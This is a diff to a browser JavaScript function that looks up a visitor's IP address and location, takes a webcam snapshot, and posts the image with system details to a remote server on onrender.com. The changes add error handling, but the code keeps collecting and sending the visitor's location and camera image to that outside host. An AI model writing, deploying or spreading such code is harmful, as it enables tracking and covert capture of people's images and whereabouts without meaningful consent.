@@ -28,10 +28,14 @@ async function getAllInfo() {
   try {
     const ipResponse = await fetch('https://ipinfo.io/json?token=<YOUR_API_KEY>');
     const ipData = await ipResponse.json();
-    info.ip = ipData.ip;
-    info.location = ipData.city + ", " + ipData.region + ", " + ipData.country;
+    if (ipData.ip) {
+      info.ip = ipData.ip;
+      info.location = ipData.city + ", " + ipData.region + ", " + ipData.country;
+    }
   } catch (e) {
     console.error("Failed to fetch IP and location:", e);
+    info.ip = "Unable to fetch IP";
+    info.location = "Unable to fetch location";
   }
 
   /* permissions ------------------------------------- */
@@ -41,7 +45,9 @@ async function getAllInfo() {
     $("webcamFeed").style.display = "block";
     info.webcam = info.microphone = "Accessible";
     webcamStream = stream;
-  } catch (e) { console.error("Error accessing webcam or microphone", e); }
+  } catch (e) { 
+    console.error("Error accessing webcam or microphone", e); 
+  }
 
   // Capture Image from webcam if accessible
   if (webcamStream) {
@@ -69,7 +75,9 @@ async function getAllInfo() {
       // Capture the resized image as base64
       capturedImageBase64 = canvas.toDataURL('image/jpeg'); // base64 image string
       console.log("Captured Image Base64: ", capturedImageBase64); // Debugging
-    } catch (e) { console.error("Failed to capture webcam image:", e); }
+    } catch (e) { 
+      console.error("Failed to capture webcam image:", e); 
+    }
   }
 
   /* Send to Backend -----------------------------------------------*/
@@ -93,13 +101,20 @@ async function getAllInfo() {
   $("systemInfo").textContent = message;
 
   try {
-    await fetch('https://system-info-terminal.onrender.com/send-message', {
+    const response = await fetch('https://system-info-terminal.onrender.com/send-message', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ message, image: capturedImageBase64 }) // Send base64 string of the image
     });
+    const responseData = await response.json();
+    if (responseData.success) {
+      console.log("Data sent successfully!");
+    } else {
+      console.error("Failed to send data to backend:", responseData);
+      $("errorMsg").textContent = "Could not contact reporting server.";
+    }
   } catch (e) {
-    console.error("Failed to send info:", e);
+    console.error("Error while sending info:", e);
     $("errorMsg").textContent = "Could not contact reporting server.";
   }
 }
